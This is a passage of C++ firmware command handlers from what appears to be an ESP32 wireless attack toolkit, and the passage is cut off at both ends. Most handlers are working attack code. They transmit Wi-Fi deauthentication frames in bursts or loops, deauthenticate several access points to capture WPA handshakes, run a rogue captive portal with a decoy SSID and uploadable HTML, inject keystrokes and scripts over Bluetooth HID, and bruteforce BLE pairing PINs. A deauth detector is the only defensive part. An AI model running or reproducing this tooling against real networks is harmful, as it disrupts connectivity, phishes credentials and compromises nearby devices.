    // ── SET_CHANNEL ──────────────────────────────────────────────────────
    else if (strcmp(cmd, "SET_CHANNEL") == 0) {
        uint8_t channel = doc["args"]["channel"] | 1;
        if (!isValidWifiChannel(channel)) {
            proto.sendResp(id, false, "invalid channel");
            return;
        }
        String regulatoryError;
        if (!validateRegulatoryChannel(channel, regulatoryError)) {
            proto.sendResp(id, false, regulatoryError.c_str());
            return;
        }
        bool ok = sniffer.setChannel(channel);
        proto.sendResp(id, ok, ok ? "channel set" : "channel change failed");
    }

    // ── SCAN_WIFI ─────────────────────────────────────────────────────────
    else if (strcmp(cmd, "SCAN_WIFI") == 0) {
        const char* band = doc["args"]["band"] | "auto";
        WifiBandMode bandMode = WifiBandMode::BAND_2G;
        String bandError;
        if (!configureWifiBand(band, bandMode, bandError)) {
            proto.sendResp(id, false, bandError.c_str());
            return;
        }

        bool wasSniffing = sniffer.active();
        uint8_t prevChannel = sniffer.channel();
        bool wasHopping = sniffer.hopping();

        radioIdle();

        int n = idf_scan_networks(proto);
        if (n < 0) {
            proto.sendResp(id, false, "scan failed");
            return;
        }

        if (n > 0) {
            uint16_t count = (uint16_t)n;
            wifi_ap_record_t* records = (wifi_ap_record_t*)malloc(
                count * sizeof(wifi_ap_record_t));

            if (records && esp_wifi_scan_get_ap_records(&count, records) == ESP_OK) {
                for (int i = 0; i < count; i++) {
                    char bssid_str[18];
                    snprintf(bssid_str, sizeof(bssid_str),
                             "%02X:%02X:%02X:%02X:%02X:%02X",
                             records[i].bssid[0], records[i].bssid[1],
                             records[i].bssid[2], records[i].bssid[3],
                             records[i].bssid[4], records[i].bssid[5]);

                    JsonDocument ev;
                    ev["ssid"]     = (char*)records[i].ssid;
                    ev["bssid"]    = bssid_str;
                    ev["channel"]  = records[i].primary;
                    ev["rssi"]     = records[i].rssi;
                    ev["security"] = authModeStr(records[i].authmode);
                    ev["wps"]      = (bool)records[i].wps;
                    ev["band"]     = wifiBandForChannel(records[i].primary);
                    proto.sendEvent("scan_ap", ev);
                }
            }
            free(records);
        }

        esp_wifi_scan_stop();

        JsonDocument resp;
        resp["ok"] = true;
        resp["count"] = n;
        resp["band"] = wifiBandModeName(bandMode);
        String json; serializeJson(resp, json);
        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());


        if (wasSniffing) {
            if (wasHopping) sniffer.startHop(300);
            else sniffer.startFixed(prevChannel, isWifi5GhzEnabled());
        }
    }

    // ── DEAUTH_BURST (capture-preserving) ────────────────────────────────
    // Sends a finite deauth burst without stopping an active sniffer. Android
    // uses this to retry deauth while waiting for a handshake capture.
    else if (strcmp(cmd, "DEAUTH_BURST") == 0) {
        JsonVariant args = doc["args"];
        const char* band = args["band"] | "auto";
        WifiBandMode bandMode = WifiBandMode::BAND_2G;
        String bandError;
        if (!configureWifiBand(band, bandMode, bandError)) {
            proto.sendResp(id, false, bandError.c_str());
            return;
        }

        uint8_t channel = args["channel"].as<uint8_t>() ? args["channel"].as<uint8_t>() : 1;
        if (!isValidWifiChannel(channel)) {
            proto.sendResp(id, false, "invalid channel");
            return;
        }
        String regulatoryError;
        if (!validateRegulatoryChannel(channel, regulatoryError)) {
            proto.sendResp(id, false, regulatoryError.c_str());
            return;
        }

        uint32_t count = args["count"].as<uint32_t>() ? args["count"].as<uint32_t>() : 1;
        count = constrain(count, 1U, 200U);
        uint16_t intervalMs = args["deauth_interval_ms"].as<uint16_t>() ?
            args["deauth_interval_ms"].as<uint16_t>() : 50;
        intervalMs = constrain(intervalMs, 10, 10000);
        uint8_t reason = args["reason"].as<uint8_t>() ? args["reason"].as<uint8_t>() : 7;

        const char* bssidStr = args["bssid"] | "";
        const char* clientStr = args["client"] | "FF:FF:FF:FF:FF:FF";
        uint8_t bssid[6] = {0};
        uint8_t client[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
        if (!parseMac(bssidStr, bssid)) {
            proto.sendResp(id, false, "invalid bssid");
            return;
        }
        if (!parseMac(clientStr, client)) {
            proto.sendResp(id, false, "invalid client");
            return;
        }

        esp_err_t setupErr = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
        if (setupErr != ESP_OK) {
            String msg = "channel set failed: ";
            msg += esp_err_to_name(setupErr);
            proto.sendResp(id, false, msg.c_str());
            return;
        }
        wifi_config_t apCfg = {};
        setupErr = esp_wifi_get_config(WIFI_IF_AP, &apCfg);
        if (setupErr == ESP_OK) {
            apCfg.ap.channel = channel;
            setupErr = esp_wifi_set_config(WIFI_IF_AP, &apCfg);
        }
        if (setupErr == ESP_OK) {
            setupErr = esp_wifi_start();
        }
        if (setupErr != ESP_OK && setupErr != ESP_ERR_WIFI_STATE) {
            String msg = "WiFi setup failed: ";
            msg += esp_err_to_name(setupErr);
            proto.sendResp(id, false, msg.c_str());
            return;
        }
        delay(20);

        DeauthTxStats stats = transmitDeauthFrames(
            bssid, client, count, intervalMs, reason
        );

        JsonDocument resp;
        resp["ok"] = true;
        resp["mode"] = "burst";
        resp["channel"] = channel;
        resp["requested_frames"] = stats.requested;
        resp["sent_frames"] = stats.sent;
        resp["failed_frames"] = stats.failed;
        resp["interval_ms"] = intervalMs;
        String json;
        serializeJson(resp, json);
        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
    }

    // ── DEAUTH_STOP ──────────────────────────────────────────────────────
    else if (strcmp(cmd, "DEAUTH_STOP") == 0) {
        const uint32_t sent = gDeauthLoopSent;
        const uint32_t failed = gDeauthLoopFailed;
        stopDeauthLoopAndWait();
        JsonDocument resp;
        resp["ok"] = true;
        resp["sent_frames"] = sent;
        resp["failed_frames"] = failed;
        String json;
        serializeJson(resp, json);
        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
    }

    // ── DEAUTH / DEAUTH_CAPTURE ──────────────────────────────────────────
    else if (strcmp(cmd, "DEAUTH") == 0 || strcmp(cmd, "DEAUTH_CAPTURE") == 0) {
        JsonVariant args = doc["args"];

        const char* band = args["band"] | "auto";
        WifiBandMode bandMode = WifiBandMode::BAND_2G;
        String bandError;
        if (!configureWifiBand(band, bandMode, bandError)) {
            proto.sendResp(id, false, bandError.c_str());
            return;
        }

        uint8_t channel = args["channel"].as<uint8_t>() ? args["channel"].as<uint8_t>() : 1;
        if (!isValidWifiChannel(channel)) {
            proto.sendResp(id, false, "invalid channel");
            return;
        }
        String regulatoryError;
        if (!validateRegulatoryChannel(channel, regulatoryError)) {
            proto.sendResp(id, false, regulatoryError.c_str());
            return;
        }

        const char* mode = args["mode"] | "burst";
        const bool loopMode = strcmp(mode, "loop") == 0 && strcmp(cmd, "DEAUTH") == 0;
        uint32_t count = args["count"].as<uint32_t>() ? args["count"].as<uint32_t>() : 150;
        count = constrain(count, 1U, 2000U);
        uint32_t durationSec = args["duration"].as<uint32_t>() ? args["duration"].as<uint32_t>() : 30;
        durationSec = constrain(durationSec, 0U, 3600U);
        uint8_t reason = args["reason"].as<uint8_t>() ? args["reason"].as<uint8_t>() : 7;
        uint16_t intervalMs = args["deauth_interval_ms"].as<uint16_t>() ?
            args["deauth_interval_ms"].as<uint16_t>() : 100;
        intervalMs = constrain(intervalMs, 10, 10000);

        const char* bssidStr = args["bssid"] | "";
        const char* clientStr = args["client"] | "FF:FF:FF:FF:FF:FF";
        uint8_t bssid[6] = {0};
        uint8_t client[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
        if (!parseMac(bssidStr, bssid)) {
            proto.sendResp(id, false, "invalid bssid");
            return;
        }
        if (!parseMac(clientStr, client)) {
            proto.sendResp(id, false, "invalid client");
            return;
        }

        radioIdle();
        esp_err_t setupErr = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
        if (setupErr != ESP_OK) {
            String msg = "channel set failed: ";
            msg += esp_err_to_name(setupErr);
            proto.sendResp(id, false, msg.c_str());
            return;
        }

        wifi_config_t apCfg = {};
        setupErr = esp_wifi_get_config(WIFI_IF_AP, &apCfg);
        if (setupErr == ESP_OK) {
            apCfg.ap.channel = channel;
            setupErr = esp_wifi_set_config(WIFI_IF_AP, &apCfg);
        }
        if (setupErr == ESP_OK) {
            setupErr = esp_wifi_start();
        }
        if (setupErr != ESP_OK && setupErr != ESP_ERR_WIFI_STATE) {
            String msg = "WiFi setup failed: ";
            msg += esp_err_to_name(setupErr);
            proto.sendResp(id, false, msg.c_str());
            return;
        }
        delay(250);

        if (loopMode) {
            gDeauthLoopSent = 0;
            gDeauthLoopFailed = 0;
            gDeauthLoopDurationSec = durationSec;
            gDeauthLoopIntervalMs = intervalMs;
            gDeauthLoopReason = reason;
            memcpy(gDeauthLoopBssid, bssid, 6);
            memcpy(gDeauthLoopClient, client, 6);
            gDeauthLoopStartedMs = millis();
            gDeauthLoopStopRequested = false;
            gDeauthLoopActive = true;

            BaseType_t created = xTaskCreate(
                deauthLoopTaskFn,
                "deauthLoop",
                4096,
                nullptr,
                1,
                &gDeauthLoopTaskHandle
            );
            if (created != pdPASS) {
                gDeauthLoopActive = false;
                gDeauthLoopTaskHandle = nullptr;
                proto.sendResp(id, false, "failed to start deauth loop task");
                return;
            }

            JsonDocument resp;
            resp["ok"] = true;
            resp["mode"] = "loop";
            resp["active"] = true;
            resp["channel"] = channel;
            resp["duration"] = durationSec;
            resp["interval_ms"] = intervalMs;
            String json;
            serializeJson(resp, json);
            proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
            return;
        }

        DeauthTxStats stats = transmitDeauthFrames(
            bssid, client, count, intervalMs, reason
        );

        if (strcmp(cmd, "DEAUTH_CAPTURE") == 0) {
            sniffer.setEapolFilter(true, bssid);
            sniffer.startFixed(channel, bandMode != WifiBandMode::BAND_2G);
        }

        JsonDocument statsDoc;
        statsDoc["status"] = "finished";
        statsDoc["mode"] = "burst";
        statsDoc["bssid"] = bssidStr;
        statsDoc["client"] = clientStr;
        statsDoc["channel"] = (int)channel;
        statsDoc["count"] = count;
        statsDoc["requested_frames"] = stats.requested;
        statsDoc["sent_frames"] = stats.sent;
        statsDoc["failed_frames"] = stats.failed;
        statsDoc["interval_ms"] = intervalMs;
        statsDoc["reason"] = reason;
        proto.sendEvent("deauth_stats", statsDoc);

        JsonDocument resp;
        resp["ok"] = true;
        resp["mode"] = "burst";
        resp["channel"] = channel;
        resp["requested_frames"] = stats.requested;
        resp["sent_frames"] = stats.sent;
        resp["failed_frames"] = stats.failed;
        resp["interval_ms"] = intervalMs;
        String json;
        serializeJson(resp, json);
        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
    }

    // ── DEAUTH_CHANNEL_CAPTURE ───────────────────────────────────────────
    // Pwnagotchi/Nrugochi-style multi-AP deauth on one channel followed by
    // all-EAPOL + all-beacon capture. This keeps the Android PCAP collector
    // open and lets Android split frames into per-BSSID HS_<BSSID>.pcap files.
    else if (strcmp(cmd, "DEAUTH_CHANNEL_CAPTURE") == 0) {
        JsonVariant args = doc["args"];
        const char* band = args["band"] | "auto";
        WifiBandMode bandMode = WifiBandMode::BAND_2G;
        String bandError;
        if (!configureWifiBand(band, bandMode, bandError)) {
            proto.sendResp(id, false, bandError.c_str());
            return;
        }
        const bool allow5ghz = bandMode != WifiBandMode::BAND_2G;
        uint8_t  channel    = args["channel"].as<uint8_t>() ? args["channel"].as<uint8_t>() : 1;
        if (!isValidWifiChannel(channel)) {
            proto.sendResp(id, false, "invalid channel");
            return;
        }
        String regulatoryError;
        if (!validateRegulatoryChannel(channel, regulatoryError)) {
            proto.sendResp(id, false, regulatoryError.c_str());
            return;
        }
        uint16_t count      = args["count"].as<uint16_t>() ? args["count"].as<uint16_t>() : 1;
        uint16_t intervalMs = 20;
        if (args.containsKey("deauth_interval_ms")) {
            intervalMs = args["deauth_interval_ms"].as<uint16_t>();
        } else if (args.containsKey("interval")) {
            intervalMs = args["interval"].as<uint16_t>();
        }
        uint8_t reason = args["reason"].as<uint8_t>() ? args["reason"].as<uint8_t>() : 7;
        bool allBeacons = args["all_beacons"] | true;

        JsonArray targets = args["targets"].as<JsonArray>();

        radioIdle();
        esp_err_t setupErr = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
        if (setupErr != ESP_OK) {
            String msg = "channel set failed: ";
            msg += esp_err_to_name(setupErr);
            proto.sendResp(id, false, msg.c_str());
            return;
        }

        wifi_config_t ap_cfg = {};
        setupErr = esp_wifi_get_config(WIFI_IF_AP, &ap_cfg);
        if (setupErr == ESP_OK) {
            ap_cfg.ap.channel = channel;
            setupErr = esp_wifi_set_config(WIFI_IF_AP, &ap_cfg);
        }
        if (setupErr != ESP_OK) {
            String msg = "AP channel sync failed: ";
            msg += esp_err_to_name(setupErr);
            proto.sendResp(id, false, msg.c_str());
            return;
        }

        setupErr = esp_wifi_start();
        if (setupErr != ESP_OK && setupErr != ESP_ERR_WIFI_STATE) {
            String msg = "WiFi start failed: ";
            msg += esp_err_to_name(setupErr);
            proto.sendResp(id, false, msg.c_str());
            return;
        }
        delay(180);

        // Start capture before transmitting so the reassociation M1/M2 exchange
        // is not missed. Beacon capture is de-duplicated per BSSID in Sniffer.
        sniffer.setEapolFilter(true, nullptr, allBeacons);
        if (!sniffer.startFixed(channel, allow5ghz)) {
            proto.sendResp(id, false, "capture start failed for channel");
            return;
        }
        delay(60);

        uint32_t totalSent = 0;
        uint32_t totalFailed = 0;
        uint16_t targetsHit = 0;
        uint32_t requestedFrames = 0;

        for (JsonVariant t : targets) {
            const char* bssidStr  = t["bssid"] | "";
            const char* clientStr = t["client"] | "FF:FF:FF:FF:FF:FF";

            uint8_t bssid[6] = {0};
            uint8_t client[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
            if (!parseMac(bssidStr, bssid)) continue;
            parseMac(clientStr, client);

            uint8_t deauth_frame[26] = {
                0xC0, 0x00, 0x00, 0x00,
                0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,   // Addr1 (client)
                0x00,0x00,0x00,0x00,0x00,0x00,   // Addr2 (BSSID)
                0x00,0x00,0x00,0x00,0x00,0x00,   // Addr3 (BSSID)
                0x00, 0x00, 0x00, 0x07            // Seq + reason
            };
            memcpy(deauth_frame + 4, client, 6);
            memcpy(deauth_frame + 10, bssid, 6);
            memcpy(deauth_frame + 16, bssid, 6);

            uint16_t seq = 0x0010;
            requestedFrames += count;
            for (uint16_t i = 0; i < count; i++) {
                deauth_frame[22] = seq & 0xFF;
                deauth_frame[23] = (seq >> 8) & 0xFF;
                deauth_frame[25] = reason;
                if (esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, 26, true) == ESP_OK) {
                    totalSent++;
                } else {
                    totalFailed++;
                }
                seq += 0x0010;
                delay(intervalMs);
            }
            targetsHit++;
        }

        JsonDocument resp;
        resp["ok"]              = targetsHit > 0;
        resp["msg"]             = targetsHit > 0
            ? "channel deauth capture started"
            : "no valid deauth targets";
        resp["band"]            = wifiBandModeName(bandMode);
        resp["channel"]         = channel;
        resp["targets"]         = targetsHit;
        resp["requested_frames"] = requestedFrames;
        resp["sent_frames"]     = totalSent;
        resp["failed_frames"]   = totalFailed;
        resp["interval_ms"]     = intervalMs;
        resp["reason"]          = reason;
        String json; serializeJson(resp, json);
        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
    }

    // ── DEAUTH DETECTOR ───────────────────────────────────────────────────
    else if (strcmp(cmd, "DEAUTH_DETECT_START") == 0) {
        radioIdle();

        const char* band = doc["args"]["band"] | "auto";
        WifiBandMode bandMode = WifiBandMode::BAND_2G;
        String bandError;
        if (!configureWifiBand(band, bandMode, bandError)) {
            proto.sendResp(id, false, bandError.c_str());
            return;
        }

        DeauthDetectConfig cfg;
        const char* mode = doc["args"]["mode"] | "fixed";
        cfg.hop = (strcmp(mode, "hop") == 0) || (doc["args"]["hop"] | false);
        cfg.include5ghz = bandMode != WifiBandMode::BAND_2G;
        cfg.channel = doc["args"]["channel"] | 1;
        cfg.intervalMs = doc["args"]["interval_ms"] | 300;
        if (!cfg.hop) {
            String regulatoryError;
            if (!validateRegulatoryChannel(cfg.channel, regulatoryError)) {
                proto.sendResp(id, false, regulatoryError.c_str());
                return;
            }
        }

        const char* bssidStr = doc["args"]["bssid"] | "";
        uint8_t bssid[6];
        if (parseMac(bssidStr, bssid)) {
            cfg.hasBssid = true;
            memcpy(cfg.bssid, bssid, 6);
        }

        const char* clientStr = doc["args"]["client"] | "";
        uint8_t client[6];
        if (parseMac(clientStr, client)) {
            cfg.hasClient = true;
            memcpy(cfg.client, client, 6);
        }

        int rssiMin = doc["args"]["rssi_min"] | -127;
        cfg.rssiMin = (int8_t)constrain(rssiMin, -127, 0);

        bool ok = deauthDetector.start(cfg);
        if (!ok) {
            proto.sendResp(id, false, "invalid channel (must be 1-14)");
        } else {
            JsonDocument resp;
            resp["ok"]      = true;
            resp["channel"] = deauthDetector.channel();
            resp["hopping"] = deauthDetector.hopping();
            String json; serializeJson(resp, json);
            proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
        }
    }

    else if (strcmp(cmd, "DEAUTH_DETECT_STOP") == 0) {
        DeauthDetectStats s = deauthDetector.stats();
        deauthDetector.stop();
        JsonDocument resp;
        resp["ok"]       = true;
        resp["detected"] = s.detected;
        resp["sent"]     = s.sent;
        resp["dropped"]  = s.dropped;
        String json; serializeJson(resp, json);
        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
    }

    else if (strcmp(cmd, "DEAUTH_DETECT_STATUS") == 0) {
        DeauthDetectStats s = deauthDetector.stats();
        JsonDocument resp;
        resp["ok"]       = true;
        resp["active"]   = deauthDetector.active();
        resp["hopping"]  = deauthDetector.hopping();
        resp["channel"]  = deauthDetector.channel();
        resp["detected"] = s.detected;
        resp["sent"]     = s.sent;
        resp["dropped"]  = s.dropped;
        String json; serializeJson(resp, json);
        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
    }

    // ── CAPTIVE PORTAL ────────────────────────────────────────────────────
    else if (strcmp(cmd, "START_PORTAL") == 0) {
        radioIdle();  // stop sniff / beacon / prior portal before starting

        const char* band = doc["args"]["band"] | "auto";
        WifiBandMode bandMode = WifiBandMode::BAND_2G;
        String bandError;
        if (!configureWifiBand(band, bandMode, bandError)) {
            proto.sendResp(id, false, bandError.c_str());
            return;
        }

        const char* ssid = doc["args"]["ssid"] | "Home Network";
        uint8_t channel = doc["args"]["channel"] | 6;
        if (!isValidWifiChannel(channel)) {
            JsonDocument resp;
            resp["ok"] = false;
            resp["error"] = "invalid_channel";
            resp["msg"] = "invalid channel";
            resp["channel"] = channel;
            String json; serializeJson(resp, json);
            proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
            return;
        }
        String regulatoryError;
        if (!validateRegulatoryChannel(channel, regulatoryError)) {
            char cc[4] = {0};
            esp_wifi_get_country_code(cc);
            JsonDocument resp;
            resp["ok"] = false;
            resp["error"] = "regulatory_channel_blocked";
            resp["msg"] = regulatoryError;
            resp["channel"] = channel;
            resp["country"] = cc[0] ? cc : "01";
            appendAllowedWifiChannels(resp);
            String json; serializeJson(resp, json);
            proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
            return;
        }
        const char* bssidStr = doc["args"]["bssid"] | "";

        uint8_t targetBssid[6] = {0};
        bool hasTarget = parseMac(bssidStr, targetBssid);

        String portalError;
        bool started = portal.start(ssid, channel, hasTarget ? targetBssid : nullptr, &portalError);
        if (started) {
            proto.sendResp(id, true, "portal started");
        } else {
            JsonDocument resp;
            resp["ok"] = false;
            resp["error"] = "softap_start_failed";
            resp["msg"] = portalError.length() ? portalError : "softAP failed";
            resp["channel"] = channel;
            appendAllowedWifiChannels(resp);
            String json; serializeJson(resp, json);
            proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
        }
    }

    else if (strcmp(cmd, "STOP_PORTAL") == 0) {
        portal.stop();
        proto.sendResp(id, true);
    }

    else if (strcmp(cmd, "RESET_HTML") == 0) {
        size_t expectedSize = doc["args"]["size"] | 0;
        bool ok = portal.resetHtml(expectedSize);

        JsonDocument ev;
        ev["type"]      = "html_reset";
        ev["expected"]  = expectedSize;
        ev["ok"]        = ok;
        ev["free_heap"] = ESP.getFreeHeap();
        proto.sendEvent("debug", ev);

        proto.sendResp(id, ok);
    }


    else if (strcmp(cmd, "SET_HTML_CHUNK") == 0) {

        const char* b64data = doc["args"]["data"] | (const char*)nullptr;
        bool last           = doc["args"]["last"]  | false;
        const bool hasOffset = !doc["args"]["offset"].isNull();
        const size_t offset = hasOffset ? doc["args"]["offset"].as<size_t>() : 0;

        if (!b64data) {
            JsonDocument ev;
            ev["type"] = "html_chunk_rejected";
            ev["reason"] = "missing_data";
            ev["offset"] = offset;
            proto.sendEvent("debug", ev);
            proto.sendResp(id, false, "missing data");
            return;
        }

        size_t b64len = strlen(b64data);
        size_t outCap = ((b64len + 3) / 4) * 3 + 2;

        // Use heap, not stack
        uint8_t* outBuf = (uint8_t*)heap_caps_malloc(outCap, MALLOC_CAP_8BIT);
        if (!outBuf) {
            JsonDocument ev;
            ev["type"] = "html_chunk_rejected";
            ev["reason"] = "oom";
            ev["offset"] = offset;
            proto.sendEvent("debug", ev);
            proto.sendResp(id, false, "oom");
            return;
        }

        size_t outLen = 0;
        int ret = mbedtls_base64_decode(outBuf, outCap, &outLen,
                                        (const unsigned char*)b64data, b64len);
        if (ret == 0) {
            const bool accepted = portal.setHtmlChunk(outBuf, outLen, last, offset, hasOffset);

            JsonDocument ev;
            ev["type"]          = accepted ? "html_chunk" : "html_chunk_rejected";
            ev["offset"]        = offset;
            ev["len"]           = outLen;
            ev["last"]          = last;
            ev["accepted"]      = accepted;
            ev["html_size"]     = portal.getBufferSize();
            ev["html_expected"] = portal.getExpectedSize();
            ev["complete"]      = portal.isComplete();
            proto.sendEvent("debug", ev);

            if (accepted) {
                proto.sendResp(id, true);
            } else {
                proto.sendResp(id, false, "html chunk rejected");
            }
        } else {
            char msg[40];
            snprintf(msg, sizeof(msg), "b64 fail ret=%d", ret);

            JsonDocument ev;
            ev["type"]   = "html_chunk_rejected";
            ev["reason"] = "decode_failed";
            ev["ret"]    = ret;
            ev["offset"] = offset;
            ev["len"]    = b64len;
            proto.sendEvent("debug", ev);

            proto.sendResp(id, false, "decode failed");
        }

        heap_caps_free(outBuf);
    }

    else if (strcmp(cmd, "PORTAL_STATUS") == 0) {
        JsonDocument resp;
        resp["ok"] = true;
        resp["running"] = portal.isRunning();
        resp["html_size"] = portal.getBufferSize();
        resp["html_expected"] = portal.getExpectedSize();
        resp["html_complete"] = portal.isComplete();
        String json; serializeJson(resp, json);
        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
    }
    #ifdef ENABLE_BLE_HID
    else if (strcmp(cmd, "BLE_SCAN_START") == 0) {
        mesh.stop();
        if (BleHid::isAdvertising() || BleHid::isConnected()) {
            proto.sendResp(id, false, "stop BLE HID before starting BLE scan");
        } else if (bleProfile.active()) {
            proto.sendResp(id, false, "stop BLE profile before starting BLE scan");
        } else {
            bool active = doc["args"]["active"] | true;
            uint16_t interval = doc["args"]["interval_ms"] | 100;
            uint16_t window = doc["args"]["window_ms"] | 99;
            uint32_t minEmit = doc["args"]["min_emit_ms"] | 1000;
            bool ok = bleScanner.start(active, interval, window, minEmit);
            proto.sendResp(id, ok, ok ? "ble scan started" : "failed to start ble scan");
        }
    }

    else if (strcmp(cmd, "BLE_SCAN_STOP") == 0) {
        bleScanner.stop();
        proto.sendResp(id, true, "ble scan stopped");
    }

    else if (strcmp(cmd, "BLE_PROFILE_START") == 0) {
        mesh.stop();
        const char* address = doc["args"]["address"] | "";
        uint8_t addressType = doc["args"]["address_type"] | 0;
        if (BleHid::isAdvertising() || BleHid::isConnected()) {
            proto.sendResp(id, false, "stop BLE HID before starting BLE profile");
        } else if (bleScanner.active()) {
            proto.sendResp(id, false, "stop BLE scan before starting BLE profile");
        } else {
            bool ok = bleProfile.start(address, addressType);
            proto.sendResp(id, ok, ok ? "ble profile started" : "failed to start ble profile");
        }
    }

    else if (strcmp(cmd, "BLE_PROFILE_STOP") == 0) {
        bleProfile.stop();
        proto.sendResp(id, true, "ble profile stopping");
    }

    else if (strcmp(cmd, "BLE_START") == 0) {
        mesh.stop();
        if (blePinBruteforce.active()) {
            proto.sendResp(id, false, "stop BLE PIN bruteforce before starting BLE HID");
        } else if (bleScanner.active()) {
            proto.sendResp(id, false, "stop BLE scan before starting BLE HID");
        } else if (bleProfile.active()) {
            proto.sendResp(id, false, "stop BLE profile before starting BLE HID");
        } else {
            radioIdle();
            const char* name = doc["args"]["name"] | "NRSuite_Keyboard";
            BleHid::begin(String(name));
            proto.sendResp(id, true, "ble started");
        }
    }

    else if (strcmp(cmd, "BLE_STATUS") == 0) {
        JsonDocument resp;
        resp["ok"]          = true; 
        resp["connected"]   = BleHid::isConnected();
        resp["advertising"] = BleHid::isAdvertising();   // ← NEW
        resp["peer"]        = BleHid::peerAddress();
        String json; serializeJson(resp, json);
        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
    }

    else if (strcmp(cmd, "BLE_STOP") == 0) {
        BleHid::end();
        blePinBruteforce.onBleEnded();
        proto.sendResp(id, true, "ble stopped");
    }

    else if (strcmp(cmd, "BLE_RUN_SCRIPT") == 0) {
        const char* script = doc["args"]["script"] | "";
        if (script[0] == '\0') {
            proto.sendResp(id, false, "missing script");
        } else if (!BleHid::isConnected()) {
            proto.sendResp(id, false, "not paired");
        } else {
            int lines = BleHid::runScript(String(script));
            JsonDocument resp;
            resp["ok"]    = true;
            resp["lines"] = lines;
            String json; serializeJson(resp, json);
            proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
        }
    }

    else if (strcmp(cmd, "BLE_STOP_SCRIPT") == 0) {
        BleHid::stop();
        proto.sendResp(id, true, "script stopped");
    }

    else if (strcmp(cmd, "BLE_KEY_DOWN") == 0) {
        const char* key = doc["args"]["key"] | "";
        if (key[0] == '\0' || !BleHid::isConnected()) {
            proto.sendResp(id, false, key[0] == '\0' ? "missing key" : "not paired");
        } else {
            BleHid::keyDown(String(key));
            proto.sendResp(id, true);
        }
    }

    else if (strcmp(cmd, "BLE_KEY_UP") == 0) {
        const char* key = doc["args"]["key"] | "";
        if (key[0] == '\0' || !BleHid::isConnected()) {
            proto.sendResp(id, false, key[0] == '\0' ? "missing key" : "not paired");
        } else {
            BleHid::keyUp(String(key));
            proto.sendResp(id, true);
        }
    }

    else if (strcmp(cmd, "BLE_KEY_TAP") == 0) {
        const char* key = doc["args"]["key"] | "";
        if (key[0] == '\0' || !BleHid::isConnected()) {
            proto.sendResp(id, false, key[0] == '\0' ? "missing key" : "not paired");
        } else {
            BleHid::tapKey(String(key));
            proto.sendResp(id, true);
        }
    }

    else if (strcmp(cmd, "BLE_TYPE_TEXT") == 0) {
        const char* text = doc["args"]["text"] | "";
        if (!BleHid::isConnected()) {
            proto.sendResp(id, false, "not paired");
        } else {
            size_t written = BleHid::typeText(String(text));
            if (written == 0 && text[0] != '\0') {
                proto.sendResp(id, false, "no supported characters");
            } else {
                proto.sendResp(id, true);
            }
        }
    }

    else if (strcmp(cmd, "BLE_MOUSE_MOVE") == 0) {
        if (!BleHid::isConnected()) {
            proto.sendResp(id, false, "not paired");
        } else {
            int dx = doc["args"]["dx"] | 0;
            int dy = doc["args"]["dy"] | 0;
            BleHid::mouseMove(dx, dy);
            proto.sendResp(id, true);
        }
    }

    else if (strcmp(cmd, "BLE_MOUSE_SCROLL") == 0) {
        if (!BleHid::isConnected()) {
            proto.sendResp(id, false, "not paired");
        } else {
            int wheel = doc["args"]["wheel"] | 0;
            BleHid::mouseScroll(wheel);
            proto.sendResp(id, true);
        }
    }

    else if (strcmp(cmd, "BLE_MOUSE_BUTTON") == 0) {
        const char* button = doc["args"]["button"] | "";
        bool down = doc["args"]["down"] | false;
        if (button[0] == '\0' || !BleHid::isConnected()) {
            proto.sendResp(id, false, button[0] == '\0' ? "missing button" : "not paired");
        } else {
            BleHid::mouseButton(String(button), down);
            proto.sendResp(id, true);
        }
    }

    else if (strcmp(cmd, "BLE_MOUSE_RELEASE") == 0) {
        if (!BleHid::isConnected()) {
            proto.sendResp(id, false, "not paired");
        } else {
            BleHid::mouseReleaseAll();
            proto.sendResp(id, true);
        }
    }

    else if (strcmp(cmd, "BLE_RELEASE_ALL") == 0) {
        BleHid::releaseAll();
        proto.sendResp(id, true);
    }

    // ── BLE HID PIN BRUTEFORCE ────────────────────────────────────────────
    else if (strcmp(cmd, "BLE_PIN_ADVERTISE_START") == 0) {
        if (bleScanner.active()) {
            proto.sendResp(id, false, "stop BLE scan before starting BLE PIN");
        } else if (bleProfile.active()) {
            proto.sendResp(id, false, "stop BLE profile before starting BLE PIN");
        } else {
            radioIdle();
            String error;
            bool ok = blePinBruteforce.advertiseStart(doc["args"], error);
            proto.sendResp(id, ok, ok ? "ble pin advertising started" : error.c_str());
        }
    }

    else if (strcmp(cmd, "BLE_PIN_ADVERTISE_STOP") == 0) {
        String error;
        bool ok = blePinBruteforce.advertiseStop(error);
        proto.sendResp(id, ok, ok ? "ble pin advertising stopped" : error.c_str());
    }

    else if (strcmp(cmd, "BLE_PIN_START") == 0) {
        String error;
        bool ok = blePinBruteforce.start(doc["args"], error);
        proto.sendResp(id, ok, ok ? "ble pin started" : error.c_str());
    }

    else if (strcmp(cmd, "BLE_PIN_PAUSE") == 0) {
        String error;
        bool ok = blePinBruteforce.pause(error);
